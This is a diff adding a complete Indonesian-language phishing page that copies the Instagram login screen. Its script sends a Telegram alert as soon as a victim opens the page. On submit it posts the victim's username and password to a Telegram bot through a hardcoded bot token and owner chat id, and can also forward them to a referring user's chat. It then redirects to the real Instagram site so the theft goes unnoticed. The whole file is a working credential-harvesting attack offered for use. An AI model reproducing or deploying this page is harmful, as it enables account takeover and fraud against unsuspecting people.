@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Login Instagram - Verifikasi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 30px;
+            overflow: hidden;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .header {
+            background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
+            padding: 30px 20px;
+            text-align: center;
+        }
+        .header h1 {
+            color: white;
+            font-size: 28px;
+        }
+        .content {
+            padding: 30px 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📷 Instagram</h1>
+        </div>
+        <div class="content">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Nomor Telepon, Username, atau Email">
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Kata Sandi">
+            </div>
+            <button class="btn" onclick="submitData()">🔓 Masuk</button>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px;">Memproses...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id') || 'unknown';
+        
+        let targetUserId = 'unknown';
+        try {
+            const decoded = atob(userId);
+            targetUserId = decoded.split('_')[0];
+        } catch(e) {}
+        
+        const BOT_TOKEN = '8887227913:AAHa5qn2FlUaWM79lmA1jvJTWjb6lK5vCiI';
+        const OWNER_ID = '8486996997';
+        
+        async function sendMessageToTelegram(chatId, message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                });
+            } catch(e) {}
+        }
+        
+        async function sendNotification() {
+            const message = `🔴 *TARGET MEMBUKA SADAPAN INSTAGRAM*\n\n👤 User ID: \`${targetUserId}\`\n🎯 Type: Instagram\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
+                await sendMessageToTelegram(targetUserId, message);
+            }
+            await sendMessageToTelegram(OWNER_ID, `👀 *INSTAGRAM DARI USER ${targetUserId}*\n${message}`);
+        }
+        
+        async function submitData() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('Harap isi semua data!');
+                return;
+            }
+            
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            const message = `📷 *HASIL SADAP INSTAGRAM*\n\n┌─────────────────┤❖├─────────────────┐\n│ 👤 User ID: \`${targetUserId}\`\n│ 📧 Username: ${username}\n│ 🔑 Password: \`${password}\`\n│ 🕐 Waktu: ${new Date().toLocaleString('id-ID')}\n└─────────────────────────────────────┘`;
+            
+            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
+                await sendMessageToTelegram(targetUserId, message);
+            }
+            await sendMessageToTelegram(OWNER_ID, `👀 *HASIL INSTAGRAM DARI USER ${targetUserId}*\n${message}`);
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com';
+            }, 2000);
+        }
+        
+        sendNotification();
+    </script>
+</body>
+</html>
